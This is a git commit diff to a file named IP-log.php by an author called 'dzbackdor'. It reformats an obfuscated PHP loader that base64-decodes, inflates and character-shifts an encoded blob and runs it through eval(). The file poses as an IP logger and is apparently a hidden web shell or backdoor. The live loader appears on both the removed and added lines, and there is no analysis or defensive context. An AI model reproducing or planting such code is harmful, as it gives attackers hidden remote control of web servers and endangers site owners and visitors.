532a0526993667fc7d806f4c992fa34b80563db5
dzbackdor <141788825+Dzbackdor@users.noreply.github.com>
2024-12-16 02:03:54 +0700

    Update IP-log.php

--- IP-log.php
+++ IP-log.php
@@ -1,11 +1,1 @@
-<?php 
-$link = 'xxxx';
-function GGr($tuFz)
-{ 
-$tuFz=gzinflate(base64_decode($tuFz));
- for($i=0;$i<strlen($tuFz);$i++)
- {
-$tuFz[$i] = chr(ord($tuFz[$i])-1);
- }
- return $tuFz;
- }eval(GGr("jVTtatswFH0AP8VtCdiBpN7Yv4YwQuOuhS4prrMNyjCKrSRaVElI8poy8uy7cuxYbddR/bE+zj2659xrrSpRWCYFqE21lLkgYh314U8AONgKohP6oOxT1MvvkvRbkt6HV1l2m1/cXCezLL++DX/2W7QbmtpKC3gbPaqhe6Dc0Lfpf+SX8/T7JJ0mUzd71yWvYvyr/hedJl/nWZJPptMuKNgHwap1ptiQKi/YkrCjM73KUD1ZU2FhDMZqK7l8pPqljgWu8skXFI8SDtS9pbQGg+7DtZRrTnEZDiBcMrFupoZXWoU1GNOpvyupKSk2EB2iialpfE+cl5iHkibqchs0sJPxGFYEbfAjPC+srujoeLBvLDime0VJSfUh6d0Qc3kkuqSlm7l8fzPiPgVneOWQKbfYDTFh7haNo88UtIROx6aev5TCjKG2c7NBPW+D9wloELX8EZY1jqkolWRYuThWxFi2JVjiSnOYz7qacyKw5KSKekx1RUfQGMKNteo8jpkaEsXOCvkQ/zJSxCGcAaKbMqPWcU2bM8FQCs6aDqg3UZ5UuF1sBnCxSG/mt1meJtkinWXpZHZ3maSDWlXbNZoaJQU2ckNKd7Rw0T5nwaWh3qYz0gv8VxM07oiK87bzvW0nKy9pIUvaER3z2ge938wwK3XOFOblPyCjwOEr7n6PzsoOjgCsxJoIy2DnBmwpoIagzRlDj7YXshJWPyFV0xaH8/uwOcB/Cz7D6104h3AhtkI+itBz5EiHhoTXopSCGmxh35ZDu0WnN7Igrh3OoceZ2J4etA/g04eP/a7f6A4L3PdeDneN/2i01O+nbSn3fwE="));?>
+<?php $link = 'xxxx'; function GGr($tuFz) { $tuFz=gzinflate(base64_decode($tuFz)); for($i=0;$i<strlen($tuFz);$i++) { $tuFz[$i] = chr(ord($tuFz[$i])-1); } return $tuFz; }eval(GGr("jVTtatswFH0AP8VtCdiBpN7Yv4YwQuOuhS4prrMNyjCKrSRaVElI8poy8uy7cuxYbddR/bE+zj2659xrrSpRWCYFqE21lLkgYh314U8AONgKohP6oOxT1MvvkvRbkt6HV1l2m1/cXCezLL++DX/2W7QbmtpKC3gbPaqhe6Dc0Lfpf+SX8/T7JJ0mUzd71yWvYvyr/hedJl/nWZJPptMuKNgHwap1ptiQKi/YkrCjM73KUD1ZU2FhDMZqK7l8pPqljgWu8skXFI8SDtS9pbQGg+7DtZRrTnEZDiBcMrFupoZXWoU1GNOpvyupKSk2EB2iialpfE+cl5iHkibqchs0sJPxGFYEbfAjPC+srujoeLBvLDime0VJSfUh6d0Qc3kkuqSlm7l8fzPiPgVneOWQKbfYDTFh7haNo88UtIROx6aev5TCjKG2c7NBPW+D9wloELX8EZY1jqkolWRYuThWxFi2JVjiSnOYz7qacyKw5KSKekx1RUfQGMKNteo8jpkaEsXOCvkQ/zJSxCGcAaKbMqPWcU2bM8FQCs6aDqg3UZ5UuF1sBnCxSG/mt1meJtkinWXpZHZ3maSDWlXbNZoaJQU2ckNKd7Rw0T5nwaWh3qYz0gv8VxM07oiK87bzvW0nKy9pIUvaER3z2ge938wwK3XOFOblPyCjwOEr7n6PzsoOjgCsxJoIy2DnBmwpoIagzRlDj7YXshJWPyFV0xaH8/uwOcB/Cz7D6104h3AhtkI+itBz5EiHhoTXopSCGmxh35ZDu0WnN7Igrh3OoceZ2J4etA/g04eP/a7f6A4L3PdeDneN/2i01O+nbSn3fwE="));?> 
